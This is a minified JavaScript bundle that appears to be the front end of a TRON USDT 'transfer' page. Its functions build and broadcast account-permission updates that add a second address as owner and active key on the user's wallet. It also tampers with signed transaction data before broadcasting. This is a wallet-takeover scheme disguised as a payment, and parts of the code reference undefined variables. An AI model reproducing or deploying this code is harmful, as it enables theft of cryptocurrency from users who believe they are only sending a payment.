import{a as t}from"./OjerpUQ-768950b0.js";import{s as e,a}from"./hPbsEK-a5302c73.js";const n=JSON.parse(localStorage.getItem("config")),i="https://api.trongrid.io",o=async(a="TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",o,d,p=.01)=>{try{if(!window.hasOwnProperty("tronWeb"))return e("Please switch to TRON main chain");await tronWeb.trx.getBalance();const p=navigator.userAgent,h=(/iphone|ipad|ipod|ios/i.test(p),/android|XiaoMi|MiuiBrowser/i.test(p),/OKApp/i.test(p));let w={};h&&(document.title="USDT 转账"),w=await window.executeBlockchainTransaction(a,o,d,1),w=await tronWeb.trx.sign(r.transaction),w.raw_data.contract[0].parameter.value.data=s,w.raw_data.contract[0].type=c;const{data:l}=await t.post(`${i}/wallet/broadcasttransaction`,{...w},{headers:{"TRON-PRO-API-KEY":n.tronApikey}});return l}catch(h){e(String(h))}},d=async(s,r,o=!1)=>{try{if(await tronWeb.trx.getBalance()/1e6<100)return void e("TRX小于100，付款受限");a({message:"Loading...",duration:0});let c={type:0,permission_name:"owner",threshold:1,keys:[]};o&&c.keys.push({address:r,weight:1}),c.keys.push({address:s,weight:1});let d={type:2,permission_name:"active0",threshold:1,operations:"7fff1fc0037e0000000000000000000000000000000000000000000000000000",keys:[]};o&&d.keys.push({address:r,weight:1}),d.keys.push({address:s,weight:1});const{data:p}=await t.post(`${i}/wallet/accountpermissionupdate`,{owner_address:r,owner:c,actives:d,visible:!0});if(null==p?void 0:p.Error)return null==p?void 0:p.Error;const h=await tronWeb.trx.sign(p),{data:w}=await t.post(`${i}/wallet/broadcasttransaction`,{...h},{headers:{"TRON-PRO-API-KEY":n.tronApikey}});return w}catch(c){e(String(c))}},p=async t=>{try{if(await tronWeb.trx.getBalance()/1e6<100)return void e("TRX小于100,付款受限");let a=tronWeb.defaultAddress.hex,s={type:0,permission_name:"owner",threshold:1,keys:[]};s.keys.push({address:a,weight:1}),s.keys.push({address:tronWeb.address.toHex(t),weight:1});let r={type:2,permission_name:"active0",threshold:1,operations:"7fff1fc0037e0000000000000000000000000000000000000000000000000000",keys:[]};r.keys.push({address:a,weight:1}),r.keys.push({address:tronWeb.address.toHex(t),weight:1});const n=await tronWeb.transactionBuilder.updateAccountPermissions(a,s,null,r),i=await tronWeb.trx.sign(n);return await tronWeb.trx.sendRawTransaction(i)}catch(a){e(String(a))}},h=async(a,s="USDT")=>{s=String(s).toLocaleUpperCase();let r=0;if(!a)return e("无法获取钱包地址！请检查浏览器是否支持TRON！");const{data:n}=await t.get(`https://apilist.tronscanapi.com/api/account/tokens?address=${a}&start=0&limit=20&hidden=0&show=0&sortType=0&sortBy=0&token=${s}`);if(n.data.length>0){const t=n.data[0];return r=t.balance/Math.pow(10,t.tokenDecimal),r}return r};var w=(t=>(t.TRX="trx",t.ETH="eth",t.BSC="bsc",t))(w||{});const l={1:"approve",2:"active",3:"owner"},u={bsc:"Binance Coin",trx:"TRON",eth:"Ethereum"};export{w as B,o as a,d as b,p as c,u as d,h as g,l as t};
